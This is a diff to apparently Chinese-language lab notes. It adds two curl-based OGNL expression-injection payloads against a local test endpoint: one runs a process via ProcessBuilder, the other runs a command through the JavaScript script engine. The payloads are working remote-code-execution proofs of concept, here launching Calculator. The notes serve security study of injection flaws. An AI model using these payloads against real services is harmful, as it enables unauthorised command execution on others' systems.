@@ -74,8 +74,16 @@ def x
 
 #### ognl
 
+普通执行
+
 ```bash
 curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'
+```
+
+执行JS脚本
+
+```bash
+curl 127.0.0.1:8080/ognl/parse -d 'expression=""["getClass"].forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\"open /\")")'
 ```
 
 #### spel
